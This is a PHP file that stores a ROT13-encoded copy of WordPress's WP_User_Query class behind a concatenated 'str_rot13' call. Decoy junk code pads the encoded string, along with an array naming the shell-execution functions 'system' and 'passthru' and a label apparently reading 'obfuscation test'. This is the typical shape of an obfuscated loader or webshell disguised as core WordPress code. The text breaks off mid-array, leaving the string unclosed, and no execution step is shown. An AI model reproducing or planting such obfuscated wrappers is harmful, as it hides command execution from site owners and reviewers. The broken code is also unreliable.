<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hfre NCV: JC_Hfre_Dhrel pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hfref
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq sbe dhrelvat hfref.
 *
 * @fvapr 3.1.0
 *
 * @frr JC_Hfre_Dhrel::cercner_dhrel() sbe vasbezngvba ba npprcgrq nethzragf.
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Hfre_Dhrel {

	/**
	 * Dhrel inef, nsgre cnefvat
	 *
	 * @fvapr 3.5.0
	 * @ine neenl
	 */
	choyvp $dhrel_inef = neenl();

	/**
	 * Yvfg bs sbhaq hfre VQf.
	 *
	 * @fvapr 3.1.0
	 * @ine neenl
	 */
	cevingr $erfhygf;

	/**
	 * Gbgny ahzore bs sbhaq hfref sbe gur pheerag dhrel
	 *
	 * @fvapr 3.1.0
	 * @ine vag
	 */
	cevingr $gbgny_hfref = 0;

	/**
	 * Zrgnqngn dhrel pbagnvare.
	 *
	 * @fvapr 4.2.0
	 * @ine JC_Zrgn_Dhrel
	 */
	choyvp $zrgn_dhrel = snyfr;

	/**
	 * Gur FDY dhrel hfrq gb srgpu zngpuvat hfref.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	choyvp $erdhrfg;

	cevingr $pbzcng_svryqf = neenl( 'erfhygf', 'gbgny_hfref' );

	// FDY pynhfrf.
	choyvp $dhrel_svryqf;
	choyvp $dhrel_sebz;
	choyvp $dhrel_jurer;
	choyvp $dhrel_beqreol;
	choyvp $dhrel_yvzvg;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz ahyy|fgevat|neenl $dhrel Bcgvbany. Gur dhrel inevnoyrf.
	 *                                 Frr JC_Hfre_Dhrel::cercner_dhrel() sbe vasbezngvba ba npprcgrq nethzragf.
	 */
	choyvp shapgvba __pbafgehpg( $dhrel = ahyy ) {
		vs ( ! rzcgl( $dhrel ) ) {
			$guvf->cercner_dhrel( $dhrel );
			$guvf->dhrel();
		}
	}

	/**
	 * Svyyf va zvffvat dhrel inevnoyrf jvgu qrsnhyg inyhrf.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat|neenl $netf Dhrel inef, nf cnffrq gb `JC_Hfre_Dhrel`.
	 * @erghea neenl Pbzcyrgr dhrel inevnoyrf jvgu haqrsvarq barf svyyrq va jvgu qrsnhygf.
	 */
	choyvp fgngvp shapgvba svyy_dhrel_inef( $netf ) {
		$qrsnhygf = neenl(
			'oybt_vq'             => trg_pheerag_oybt_vq(),
			'ebyr'                => '',
			'ebyr__va'            => neenl(),
			'ebyr__abg_va'        => neenl(),
			'pncnovyvgl'          => '',
			'pncnovyvgl__va'      => neenl(),
			'pncnovyvgl__abg_va'  => neenl(),
			'zrgn_xrl'            => '',
			'zrgn_inyhr'          => '',
			'zrgn_pbzcner'        => '',
			'vapyhqr'             => neenl(),
			'rkpyhqr'             => neenl(),
			'frnepu'              => '',
			'frnepu_pbyhzaf'      => neenl(),
			'beqreol'             => 'ybtva',
			'beqre'               => 'NFP',
			'bssfrg'              => '',
			'ahzore'              => '',
			'cntrq'               => 1,
			'pbhag_gbgny'         => gehr,
			'svryqf'              => 'nyy',
			'jub'                 => '',
			'unf_choyvfurq_cbfgf' => ahyy,
			'avpranzr'            => '',
			'avpranzr__va'        => neenl(),
			'avpranzr__abg_va'    => neenl(),
			'ybtva'               => '',
			'ybtva__va'           => neenl(),
			'ybtva__abg_va'       => neenl(),
			'pnpur_erfhygf'       => gehr,
		);

		erghea jc_cnefr_netf( $netf, $qrsnhygf );
	}

	/**
	 * Cercnerf gur dhrel inevnoyrf.
	 *
	 * @fvapr 3.1.0
	 * @fvapr 4.1.0 Nqqrq gur novyvgl gb beqre ol gur `vapyhqr` inyhr.
	 * @fvapr 4.2.0 Nqqrq 'zrgn_inyhr_ahz' fhccbeg sbe `$beqreol` cnenzrgre. Nqqrq zhygv-qvzrafvbany neenl flagnk
	 *              sbe `$beqreol` cnenzrgre.
	 * @fvapr 4.3.0 Nqqrq 'unf_choyvfurq_cbfgf' cnenzrgre.
	 * @fvapr 4.4.0 Nqqrq 'cntrq', 'ebyr__va', naq 'ebyr__abg_va' cnenzrgref. Gur 'ebyr' cnenzrgre jnf hcqngrq gb
	 *              crezvg na neenl be pbzzn-frcnengrq yvfg bs inyhrf. Gur 'ahzore' cnenzrgre jnf hcqngrq gb fhccbeg
	 *              dhrelvat sbe nyy hfref jvgu hfvat -1.
	 * @fvapr 4.7.0 Nqqrq 'avpranzr', 'avpranzr__va', 'avpranzr__abg_va', 'ybtva', 'ybtva__va',
	 *              naq 'ybtva__abg_va' cnenzrgref.
	 * @fvapr 5.1.0 Vagebqhprq gur 'zrgn_pbzcner_xrl' cnenzrgre.
	 * @fvapr 5.3.0 Vagebqhprq gur 'zrgn_glcr_xrl' cnenzrgre.
	 * @fvapr 5.9.0 Nqqrq 'pncnovyvgl', 'pncnovyvgl__va', naq 'pncnovyvgl__abg_va' cnenzrgref.
	 *              Qrcerpngrq gur 'jub' cnenzrgre.
	 * @fvapr 6.3.0 Nqqrq 'pnpur_erfhygf' cnenzrgre.
	 *
	 * @tybony jcqo     $jcqo     JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 * @tybony JC_Ebyrf $jc_ebyrf JbeqCerff ebyr znantrzrag bowrpg.
	 *
	 * @cnenz fgevat|neenl $dhrel {
	 *     Bcgvbany. Neenl be fgevat bs dhrel cnenzrgref.
	 *
	 *     @glcr vag             $oybt_vq             Gur fvgr VQ. Qrsnhyg vf gur pheerag fvgr.
	 *     @glcr fgevat|fgevat[] $ebyr                Na neenl be n pbzzn-frcnengrq yvfg bs ebyr anzrf gung hfref
	 *                                                zhfg zngpu gb or vapyhqrq va erfhygf. Abgr gung guvf vf
	 *                                                na vapyhfvir yvfg: hfref zhfg zngpu *rnpu* ebyr. Qrsnhyg rzcgl.
	 *     @glcr fgevat[]        $ebyr__va            Na neenl bs ebyr anzrf. Zngpurq hfref zhfg unir ng yrnfg bar
	 *                                                bs gurfr ebyrf. Qrsnhyg rzcgl neenl.
	 *     @glcr fgevat[]        $ebyr__abg_va        Na neenl bs ebyr anzrf gb rkpyhqr. Hfref zngpuvat bar be zber
	 *                                                bs gurfr ebyrf jvyy abg or vapyhqrq va erfhygf. Qrsnhyg rzcgl neenl.
	 *     @glcr fgevat|fgevat[] $zrgn_xrl            Zrgn xrl be xrlf gb svygre ol.
	 *     @glcr fgevat|fgevat[] $zrgn_inyhr          Zrgn inyhr be inyhrf gb svygre ol.
	 *     @glcr fgevat          $zrgn_pbzcner        ZlFDY bcrengbe hfrq sbe pbzcnevat gur zrgn inyhr.
	 *                                                Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr fgevat          $zrgn_pbzcner_xrl    ZlFDY bcrengbe hfrq sbe pbzcnevat gur zrgn xrl.
	 *                                                Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr fgevat          $zrgn_glcr           ZlFDY qngn glcr gung gur zrgn_inyhr pbyhza jvyy or PNFG gb sbe pbzcnevfbaf.
	 *                                                Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr fgevat          $zrgn_glcr_xrl       ZlFDY qngn glcr gung gur zrgn_xrl pbyhza jvyy or PNFG gb sbe pbzcnevfbaf.
	 *                                                Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr neenl           $zrgn_dhrel          Na nffbpvngvir neenl bs JC_Zrgn_Dhrel nethzragf.
	 *                                                Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf.
	 *     @glcr fgevat|fgevat[] $pncnovyvgl          Na neenl be n pbzzn-frcnengrq yvfg bs pncnovyvgl anzrf gung hfref
	 *                                                zhfg zngpu gb or vapyhqrq va erfhygf. Abgr gung guvf vf
	 *                                                na vapyhfvir yvfg: hfref zhfg zngpu *rnpu* pncnovyvgl.
	 *                                                Qbrf ABG jbex sbe pncnovyvgvrf abg va gur qngnonfr be svygrerq
	 *                                                ivn {@frr 'znc_zrgn_pnc'}. Qrsnhyg rzcgl.
	 *     @glcr fgevat[]        $pncnovyvgl__va      Na neenl bs pncnovyvgl anzrf. Zngpurq hfref zhfg unir ng yrnfg bar
	 *                                                bs gurfr pncnovyvgvrf.
	 *                                                Qbrf ABG jbex sbe pncnovyvgvrf abg va gur qngnonfr be svygrerq
	 *                                                ivn {@frr 'znc_zrgn_pnc'}. Qrsnhyg rzcgl neenl.
	 *     @glcr fgevat[]        $pncnovyvgl__abg_va  Na neenl bs pncnovyvgl anzrf gb rkpyhqr. Hfref zngpuvat bar be zber
	 *                                                bs gurfr pncnovyvgvrf jvyy abg or vapyhqrq va erfhygf.
	 *                                                Qbrf ABG jbex sbe pncnovyvgvrf abg va gur qngnonfr be svygrerq
	 *                                                ivn {@frr 'znc_zrgn_pnc'}. Qrsnhyg rzcgl neenl.
	 *     @glcr vag[]           $vapyhqr             Na neenl bs hfre VQf gb vapyhqr. Qrsnhyg rzcgl neenl.
	 *     @glcr vag[]           $rkpyhqr             Na neenl bs hfre VQf gb rkpyhqr. Qrsnhyg rzcgl neenl.
	 *     @glcr fgevat          $frnepu              Frnepu xrljbeq. Frnepurf sbe cbffvoyr fgevat zngpurf ba pbyhzaf.
	 *                                                Jura `$frnepu_pbyhzaf` vf yrsg rzcgl, vg gevrf gb qrgrezvar juvpu
	 *                                                pbyhza gb frnepu va onfrq ba frnepu fgevat. Qrsnhyg rzcgl.
	 *     @glcr fgevat[]        $frnepu_pbyhzaf      Neenl bs pbyhza anzrf gb or frnepurq. Npprcgf 'VQ', 'hfre_ybtva',
	 *                                                'hfre_rznvy', 'hfre_hey', 'hfre_avpranzr', 'qvfcynl_anzr'.
	 *                                                Qrsnhyg rzcgl neenl.
	 *     @glcr fgevat|neenl    $beqreol             Svryq(f) gb fbeg gur ergevrirq hfref ol. Znl or n fvatyr inyhr,
	 *                                                na neenl bs inyhrf, be n zhygv-qvzrafvbany neenl jvgu svryqf nf
	 *                                                xrlf naq beqref ('NFP' be 'QRFP') nf inyhrf. Npprcgrq inyhrf ner:
	 *                                                - 'VQ'
	 *                                                - 'qvfcynl_anzr' (be 'anzr')
	 *                                                - 'vapyhqr'
	 *                                                - 'hfre_ybtva' (be 'ybtva')
	 *                                                - 'ybtva__va'
	 *                                                - 'hfre_avpranzr' (be 'avpranzr')
	 *                                                - 'avpranzr__va'
	 *                                                - 'hfre_rznvy' (be 'rznvy')
	 *                                                - 'hfre_hey' (be 'hey')
	 *                                                - 'hfre_ertvfgrerq' (be 'ertvfgrerq')
	 *                                                - 'cbfg_pbhag'
	 *                                                - 'zrgn_inyhr'
	 *                                                - 'zrgn_inyhr_ahz'
	 *                                                - Gur inyhr bs `$zrgn_xrl`
	 *                                                - Na neenl xrl bs `$zrgn_dhrel`
	 *                                                Gb hfr 'zrgn_inyhr' be 'zrgn_inyhr_ahz', `$zrgn_xrl`
	 *                                                zhfg or nyfb or qrsvarq. Qrsnhyg 'hfre_ybtva'.
	 *     @glcr fgevat          $beqre               Qrfvtangrf nfpraqvat be qrfpraqvat beqre bs hfref. Beqre inyhrf
	 *                                                cnffrq nf cneg bs na `$beqreol` neenl gnxr cerprqrapr bire guvf
	 *                                                cnenzrgre. Npprcgf 'NFP', 'QRFP'. Qrsnhyg 'NFP'.
	 *     @glcr vag             $bssfrg              Ahzore bs hfref gb bssfrg va ergevrirq erfhygf. Pna or hfrq va
	 *                                                pbawhapgvba jvgu cntvangvba. Qrsnhyg 0.
	 *     @glcr vag             $ahzore              Ahzore bs hfref gb yvzvg gur dhrel sbe. Pna or hfrq va
	 *                                                pbawhapgvba jvgu cntvangvba. Inyhr -1 (nyy) vf fhccbegrq, ohg
	 *                                                fubhyq or hfrq jvgu pnhgvba ba ynetre fvgrf.
	 *                                                Qrsnhyg -1 (nyy hfref).
	 *     @glcr vag             $cntrq               Jura hfrq jvgu ahzore, qrsvarf gur cntr bs erfhygf gb erghea.
	 *                                                Qrsnhyg 1.
	 *     @glcr obby            $pbhag_gbgny         Jurgure gb pbhag gur gbgny ahzore bs hfref sbhaq. Vs cntvangvba
	 *                                                vf abg arrqrq, frggvat guvf gb snyfr pna vzcebir cresbeznapr.
	 *                                                Qrsnhyg gehr.
	 *     @glcr fgevat|fgevat[] $svryqf              Juvpu svryqf gb erghea. Fvatyr be nyy svryqf (fgevat), be neenl
	 *                                                bs svryqf. Npprcgf:
	 *                                                - 'VQ'
	 *                                                - 'qvfcynl_anzr'
	 *                                                - 'hfre_ybtva'
	 *                                                - 'hfre_avpranzr'
	 *                                                - 'hfre_rznvy'
	 *                                                - 'hfre_hey'
	 *                                                - 'hfre_ertvfgrerq'
	 *                                                - 'hfre_cnff'
	 *                                                - 'hfre_npgvingvba_xrl'
	 *                                                - 'hfre_fgnghf'
	 *                                                - 'fcnz' (bayl ninvynoyr ba zhygvfvgr vafgnyyf)
	 *                                                - 'qryrgrq' (bayl ninvynoyr ba zhygvfvgr vafgnyyf)
	 *                                                - 'nyy' sbe nyy svryqf naq ybnqf hfre zrgn.
	 *                                                - 'nyy_jvgu_zrgn' Qrcerpngrq. Hfr 'nyy'.
	 *                                                Qrsnhyg 'nyy'.
	 *     @glcr fgevat          $jub                 Qrcerpngrq, hfr `$pncnovyvgl` vafgrnq.
	 *                                                Glcr bs hfref gb dhrel. Npprcgf 'nhgubef'.
	 *                                                Qrsnhyg rzcgl (nyy hfref).
	 *     @glcr obby|fgevat[]   $unf_choyvfurq_cbfgf Cnff na neenl bs cbfg glcrf gb svygre erfhygf gb hfref jub unir
	 *                                                choyvfurq cbfgf va gubfr cbfg glcrf. `gehr` vf na nyvnf sbe nyy
	 *                                                choyvp cbfg glcrf.
	 *     @glcr fgevat          $avpranzr            Gur hfre avpranzr. Qrsnhyg rzcgl.
	 *     @glcr fgevat[]        $avpranzr__va        Na neenl bs avpranzrf gb vapyhqr. Hfref zngpuvat bar bs gurfr
	 *                                                avpranzrf jvyy or vapyhqrq va erfhygf. Qrsnhyg rzcgl neenl.
	 *     @glcr fgevat[]        $avpranzr__abg_va    Na neenl bs avpranzrf gb rkpyhqr. Hfref zngpuvat bar bs gurfr
	 *                                                avpranzrf jvyy abg or vapyhqrq va erfhygf. Qrsnhyg rzcgl neenl.
	 *     @glcr fgevat          $ybtva               Gur hfre ybtva. Qrsnhyg rzcgl.
	 *     @glcr fgevat[]        $ybtva__va           Na neenl bs ybtvaf gb vapyhqr. Hfref zngpuvat bar bs gurfr
	 *                                                ybtvaf jvyy or vapyhqrq va erfhygf. Qrsnhyg rzcgl neenl.
	 *     @glcr fgevat[]        $ybtva__abg_va       Na neenl bs ybtvaf gb rkpyhqr. Hfref zngpuvat bar bs gurfr
	 *                                                ybtvaf jvyy abg or vapyhqrq va erfhygf. Qrsnhyg rzcgl neenl.
	 *     @glcr obby            $pnpur_erfhygf       Jurgure gb pnpur hfre vasbezngvba. Qrsnhyg gehr.
	 * }
	 */
	choyvp shapgvba cercner_dhrel( $dhrel = neenl() ) {
		tybony $jcqo, $jc_ebyrf;

		vs ( rzcgl( $guvf->dhrel_inef ) || ! rzcgl( $dhrel ) ) {
			$guvf->dhrel_yvzvg = ahyy;
			$guvf->dhrel_inef  = $guvf->svyy_dhrel_inef( $dhrel );
		}

		/**
		 * Sverf orsber gur JC_Hfre_Dhrel unf orra cnefrq.
		 *
		 * Gur cnffrq JC_Hfre_Dhrel bowrpg pbagnvaf gur dhrel inevnoyrf,
		 * abg lrg cnffrq vagb FDY.
		 *
		 * @fvapr 4.0.0
		 *
		 * @cnenz JC_Hfre_Dhrel $dhrel Pheerag vafgnapr bs JC_Hfre_Dhrel (cnffrq ol ersrerapr).
		 */
		qb_npgvba_ers_neenl( 'cer_trg_hfref', neenl( &$guvf ) );

		// Rafher gung dhrel inef ner svyyrq nsgre 'cer_trg_hfref'.
		$di =& $guvf->dhrel_inef;
		$di = $guvf->svyy_dhrel_inef( $di );

		$nyybjrq_svryqf = neenl(
			'vq',
			'hfre_ybtva',
			'hfre_cnff',
			'hfre_avpranzr',
			'hfre_rznvy',
			'hfre_hey',
			'hfre_ertvfgrerq',
			'hfre_npgvingvba_xrl',
			'hfre_fgnghf',
			'qvfcynl_anzr',
		);
		vs ( vf_zhygvfvgr() ) {
			$nyybjrq_svryqf[] = 'fcnz';
			$nyybjrq_svryqf[] = 'qryrgrq';
		}

		vs ( vf_neenl( $di['svryqf'] ) ) {
			$di['svryqf'] = neenl_znc( 'fgegbybjre', $di['svryqf'] );
			$di['svryqf'] = neenl_vagrefrpg( neenl_havdhr( $di['svryqf'] ), $nyybjrq_svryqf );

			vs ( rzcgl( $di['svryqf'] ) ) {
				$di['svryqf'] = neenl( 'vq' );
			}

			$guvf->dhrel_svryqf = neenl();
			sbernpu ( $di['svryqf'] nf $svryq ) {
				$svryq                = 'vq' === $svryq ? 'VQ' : fnavgvmr_xrl( $svryq );
				$guvf->dhrel_svryqf[] = \"$jcqo->hfref.$svryq\";
			}
			$guvf->dhrel_svryqf = vzcybqr( ',', $guvf->dhrel_svryqf );
		} ryfrvs ( 'nyy_jvgu_zrgn' === $di['svryqf'] || 'nyy' === $di['svryqf'] || ! va_neenl( $di['svryqf'], $nyybjrq_svryqf, gehr ) ) {
			$guvf->dhrel_svryqf = \"$jcqo->hfref.VQ\";
		} ryfr {
			$svryq              = 'vq' === fgegbybjre( $di['svryqf'] ) ? 'VQ' : fnavgvmr_xrl( $di['svryqf'] );
			$guvf->dhrel_svryqf = \"$jcqo->hfref.$svryq\";
		}

		vs ( vffrg( $di['pbhag_gbgny'] ) && $di['pbhag_gbgny'] ) {
			$guvf->dhrel_svryqf = 'FDY_PNYP_SBHAQ_EBJF ' . $guvf->dhrel_svryqf;
		}

		$guvf->dhrel_sebz  = \"SEBZ $jcqo->hfref\";
		$guvf->dhrel_jurer = 'JURER 1=1';

		// Cnefr naq fnavgvmr 'vapyhqr', sbe hfr ol 'beqreol' nf jryy nf 'vapyhqr' orybj.
		vs ( ! rzcgl( $di['vapyhqr'] ) ) {
			$vapyhqr = jc_cnefr_vq_yvfg( $di['vapyhqr'] );
		} ryfr {
			$vapyhqr = snyfr;
		}

		$oybt_vq = 0;
		vs ( vffrg( $di['oybt_vq'] ) ) {
			$oybt_vq = nofvag( $di['oybt_vq'] );
		}

		vs ( $di['unf_choyvfurq_cbfgf'] && $oybt_vq ) {
			vs ( gehr === $di['unf_choyvfurq_cbfgf'] ) {
				$cbfg_glcrf = trg_cbfg_glcrf( neenl( 'choyvp' => gehr ) );
			} ryfr {
				$cbfg_glcrf = (neenl) $di['unf_choyvfurq_cbfgf'];
			}

			sbernpu ( $cbfg_glcrf nf &$cbfg_glcr ) {
				$cbfg_glcr = $jcqo->cercner( '%f', $cbfg_glcr );
			}

			$cbfgf_gnoyr        = $jcqo->trg_oybt_cersvk( $oybt_vq ) . 'cbfgf';
			$guvf->dhrel_jurer .= \" NAQ $jcqo->hfref.VQ VA ( FRYRPG QVFGVAPG $cbfgf_gnoyr.cbfg_nhgube SEBZ $cbfgf_gnoyr JURER $cbfgf_gnoyr.cbfg_fgnghf = 'choyvfu' NAQ $cbfgf_gnoyr.cbfg_glcr VA ( \" . vzcybqr( ', ', $cbfg_glcrf ) . ' ) )';
		}

		// avpranzr
		vs ( '' !== $di['avpranzr'] ) {
			$guvf->dhrel_jurer .= $jcqo->cercner( ' NAQ hfre_avpranzr = %f', $di['avpranzr'] );
		}

		vs ( ! rzcgl( $di['avpranzr__va'] ) ) {
			$fnavgvmrq_avpranzr__va = neenl_znc( 'rfp_fdy', $di['avpranzr__va'] );
			$avpranzr__va           = vzcybqr( \"','\", $fnavgvmrq_avpranzr__va );
			$guvf->dhrel_jurer     .= \" NAQ hfre_avpranzr VA ( '$avpranzr__va' )\";
		}

		vs ( ! rzcgl( $di['avpranzr__abg_va'] ) ) {
			$fnavgvmrq_avpranzr__abg_va = neenl_znc( 'rfp_fdy', $di['avpranzr__abg_va'] );
			$avpranzr__abg_va           = vzcybqr( \"','\", $fnavgvmrq_avpranzr__abg_va );
			$guvf->dhrel_jurer         .= \" NAQ hfre_avpranzr ABG VA ( '$avpranzr__abg_va' )\";
		}

		// ybtva
		vs ( '' !== $di['ybtva'] ) {
			$guvf->dhrel_jurer .= $jcqo->cercner( ' NAQ hfre_ybtva = %f', $di['ybtva'] );
		}

		vs ( ! rzcgl( $di['ybtva__va'] ) ) {
			$fnavgvmrq_ybtva__va = neenl_znc( 'rfp_fdy', $di['ybtva__va'] );
			$ybtva__va           = vzcybqr( \"','\", $fnavgvmrq_ybtva__va );
			$guvf->dhrel_jurer  .= \" NAQ hfre_ybtva VA ( '$ybtva__va' )\";
		}

		vs ( ! rzcgl( $di['ybtva__abg_va'] ) ) {
			$fnavgvmrq_ybtva__abg_va = neenl_znc( 'rfp_fdy', $di['ybtva__abg_va'] );
			$ybtva__abg_va           = vzcybqr( \"','\", $fnavgvmrq_ybtva__abg_va );
			$guvf->dhrel_jurer      .= \" NAQ hfre_ybtva ABG VA ( '$ybtva__abg_va' )\";
		}

		// Zrgn dhrel.
		$guvf->zrgn_dhrel = arj JC_Zrgn_Dhrel();
		$guvf->zrgn_dhrel->cnefr_dhrel_inef( $di );

		vs ( vffrg( $di['jub'] ) && 'nhgubef' === $di['jub'] && $oybt_vq ) {
			_qrcerpngrq_nethzrag(
				'JC_Hfre_Dhrel',
				'5.9.0',
				fcevags(
					/* genafyngbef: 1: jub, 2: pncnovyvgl */
					__( '%1$f vf qrcerpngrq. Hfr %2$f vafgrnq.' ),
					'<pbqr>jub</pbqr>',
					'<pbqr>pncnovyvgl</pbqr>'
				)
			);

			$jub_dhrel = neenl(
				'xrl'     => $jcqo->trg_oybt_cersvk( $oybt_vq ) . 'hfre_yriry',
				'inyhr'   => 0,
				'pbzcner' => '!=',
			);

			// Cerirag rkgen zrgn dhrel.
			$di['oybt_vq'] = 0;
			$oybt_vq       = 0;

			vs ( rzcgl( $guvf->zrgn_dhrel->dhrevrf ) ) {
				$guvf->zrgn_dhrel->dhrevrf = neenl( $jub_dhrel );
			} ryfr {
				// Nccraq gur pnc dhrel gb gur bevtvany dhrevrf naq ercnefr gur dhrel.
				$guvf->zrgn_dhrel->dhrevrf = neenl(
					'eryngvba' => 'NAQ',
					neenl( $guvf->zrgn_dhrel->dhrevrf, $jub_dhrel ),
				);
			}

			$guvf->zrgn_dhrel->cnefr_dhrel_inef( $guvf->zrgn_dhrel->dhrevrf );
		}

		// Ebyrf.
		$ebyrf = neenl();
		vs ( vffrg( $di['ebyr'] ) ) {
			vs ( vf_neenl( $di['ebyr'] ) ) {
				$ebyrf = $di['ebyr'];
			} ryfrvs ( vf_fgevat( $di['ebyr'] ) && ! rzcgl( $di['ebyr'] ) ) {
				$ebyrf = neenl_znc( 'gevz', rkcybqr( ',', $di['ebyr'] ) );
			}
		}

		$ebyr__va = neenl();
		vs ( vffrg( $di['ebyr__va'] ) ) {
			$ebyr__va = (neenl) $di['ebyr__va'];
		}

		$ebyr__abg_va = neenl();
		vs ( vffrg( $di['ebyr__abg_va'] ) ) {
			$ebyr__abg_va = (neenl) $di['ebyr__abg_va'];
		}

		// Pncnovyvgvrf.
		$ninvynoyr_ebyrf = neenl();

		vs ( ! rzcgl( $di['pncnovyvgl'] ) || ! rzcgl( $di['pncnovyvgl__va'] ) || ! rzcgl( $di['pncnovyvgl__abg_va'] ) ) {
			$jc_ebyrf->sbe_fvgr( $oybt_vq );
			$ninvynoyr_ebyrf = $jc_ebyrf->ebyrf;
		}

		$pncnovyvgvrf = neenl();
		vs ( ! rzcgl( $di['pncnovyvgl'] ) ) {
			vs ( vf_neenl( $di['pncnovyvgl'] ) ) {
				$pncnovyvgvrf = $di['pncnovyvgl'];
			} ryfrvs ( vf_fgevat( $di['pncnovyvgl'] ) ) {
				$pncnovyvgvrf = neenl_znc( 'gevz', rkcybqr( ',', $di['pncnovyvgl'] ) );
			}
		}

		$pncnovyvgl__va = neenl();
		vs ( ! rzcgl( $di['pncnovyvgl__va'] ) ) {
			$pncnovyvgl__va = (neenl) $di['pncnovyvgl__va'];
		}

		$pncnovyvgl__abg_va = neenl();
		vs ( ! rzcgl( $di['pncnovyvgl__abg_va'] ) ) {
			$pncnovyvgl__abg_va = (neenl) $di['pncnovyvgl__abg_va'];
		}

		// Xrrc genpx bs nyy pncnovyvgvrf naq gur ebyrf gurl'er nqqrq ba.
		$pncf_jvgu_ebyrf = neenl();

		sbernpu ( $ninvynoyr_ebyrf nf $ebyr => $ebyr_qngn ) {
			$ebyr_pncf = neenl_xrlf( neenl_svygre( $ebyr_qngn['pncnovyvgvrf'] ) );

			sbernpu ( $pncnovyvgvrf nf $pnc ) {
				vs ( va_neenl( $pnc, $ebyr_pncf, gehr ) ) {
					$pncf_jvgu_ebyrf[ $pnc ][] = $ebyr;
					oernx;
				}
			}

			sbernpu ( $pncnovyvgl__va nf $pnc ) {
				vs ( va_neenl( $pnc, $ebyr_pncf, gehr ) ) {
					$ebyr__va[] = $ebyr;
					oernx;
				}
			}

			sbernpu ( $pncnovyvgl__abg_va nf $pnc ) {
				vs ( va_neenl( $pnc, $ebyr_pncf, gehr ) ) {
					$ebyr__abg_va[] = $ebyr;
					oernx;
				}
			}
		}

		$ebyr__va     = neenl_zretr( $ebyr__va, $pncnovyvgl__va );
		$ebyr__abg_va = neenl_zretr( $ebyr__abg_va, $pncnovyvgl__abg_va );

		$ebyrf        = neenl_havdhr( $ebyrf );
		$ebyr__va     = neenl_havdhr( $ebyr__va );
		$ebyr__abg_va = neenl_havdhr( $ebyr__abg_va );

		// Fhccbeg dhrelvat ol pncnovyvgvrf nqqrq qverpgyl gb hfref.
		vs ( $oybt_vq && ! rzcgl( $pncnovyvgvrf ) ) {
			$pncnovyvgvrf_pynhfrf = neenl( 'eryngvba' => 'NAQ' );

			sbernpu ( $pncnovyvgvrf nf $pnc ) {
				$pynhfr = neenl( 'eryngvba' => 'BE' );

				$pynhfr[] = neenl(
					'xrl'     => $jcqo->trg_oybt_cersvk( $oybt_vq ) . 'pncnovyvgvrf',
					'inyhr'   => '\"' . $pnc . '\"',
					'pbzcner' => 'YVXR',
				);

				vs ( ! rzcgl( $pncf_jvgu_ebyrf[ $pnc ] ) ) {
					sbernpu ( $pncf_jvgu_ebyrf[ $pnc ] nf $ebyr ) {
						$pynhfr[] = neenl(
							'xrl'     => $jcqo->trg_oybt_cersvk( $oybt_vq ) . 'pncnovyvgvrf',
							'inyhr'   => '\"' . $ebyr . '\"',
							'pbzcner' => 'YVXR',
						);
					}
				}

				$pncnovyvgvrf_pynhfrf[] = $pynhfr;
			}

			$ebyr_dhrevrf[] = $pncnovyvgvrf_pynhfrf;

			vs ( rzcgl( $guvf->zrgn_dhrel->dhrevrf ) ) {
				$guvf->zrgn_dhrel->dhrevrf[] = $pncnovyvgvrf_pynhfrf;
			} ryfr {
				// Nccraq gur pnc dhrel gb gur bevtvany dhrevrf naq ercnefr gur dhrel.
				$guvf->zrgn_dhrel->dhrevrf = neenl(
					'eryngvba' => 'NAQ',
					neenl( $guvf->zrgn_dhrel->dhrevrf, neenl( $pncnovyvgvrf_pynhfrf ) ),
				);
			}

			$guvf->zrgn_dhrel->cnefr_dhrel_inef( $guvf->zrgn_dhrel->dhrevrf );
		}

		vs ( $oybt_vq && ( ! rzcgl( $ebyrf ) || ! rzcgl( $ebyr__va ) || ! rzcgl( $ebyr__abg_va ) || vf_zhygvfvgr() ) ) {
			$ebyr_dhrevrf = neenl();

			$ebyrf_pynhfrf = neenl( 'eryngvba' => 'NAQ' );
			vs ( ! rzcgl( $ebyrf ) ) {
				sbernpu ( $ebyrf nf $ebyr ) {
					$ebyrf_pynhfrf[] = neenl(
						'xrl'     => $jcqo->trg_oybt_cersvk( $oybt_vq ) . 'pncnovyvgvrf',
						'inyhr'   => '\"' . $ebyr . '\"',
						'pbzcner' => 'YVXR',
					);
				}

				$ebyr_dhrevrf[] = $ebyrf_pynhfrf;
			}

			$ebyr__va_pynhfrf = neenl( 'eryngvba' => 'BE' );
			vs ( ! rzcgl( $ebyr__va ) ) {
				sbernpu ( $ebyr__va nf $ebyr ) {
					$ebyr__va_pynhfrf[] = neenl(
						'xrl'     => $jcqo->trg_oybt_cersvk( $oybt_vq ) . 'pncnovyvgvrf',
						'inyhr'   => '\"' . $ebyr . '\"',
						'pbzcner' => 'YVXR',
					);
				}

				$ebyr_dhrevrf[] = $ebyr__va_pynhfrf;
			}

			$ebyr__abg_va_pynhfrf = neenl( 'eryngvba' => 'NAQ' );
			vs ( ! rzcgl( $ebyr__abg_va ) ) {
				sbernpu ( $ebyr__abg_va nf $ebyr ) {
					$ebyr__abg_va_pynhfrf[] = neenl(
						'xrl'     => $jcqo->trg_oybt_cersvk( $oybt_vq ) . 'pncnovyvgvrf',
